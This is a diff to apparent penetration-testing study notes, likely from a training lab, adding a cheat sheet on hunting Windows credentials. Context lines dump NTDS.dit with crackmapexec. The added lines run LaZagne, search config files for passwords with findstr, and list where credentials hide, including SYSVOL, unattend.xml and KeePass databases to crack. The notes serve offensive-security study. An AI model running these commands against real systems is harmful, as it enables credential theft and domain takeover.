@@ -225,3 +225,28 @@ cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTD
 ```
 crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
 ```
+
+## Credential Hunting in Windows
+
+### Lazagne 
+- [https://github.com/AlessandroZ/LaZagne?](https://github.com/AlessandroZ/LaZagne?)
+```
+.\lazagne.exe all
+```
+
+### Using findstr
+
+```cnd
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+```
+
+**keep in mind when credential hunting:**
+- Passwords in Group Policy in the SYSVOL share
+- Passwords in scripts in the SYSVOL share
+- Password in scripts on IT shares
+- Passwords in web.config files on dev machines and IT shares
+- unattend.xml
+- Passwords in the AD user or computer description fields
+- KeePass databases --> pull hash, crack and get loads of access.
+- Found on user systems and shares
+- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint
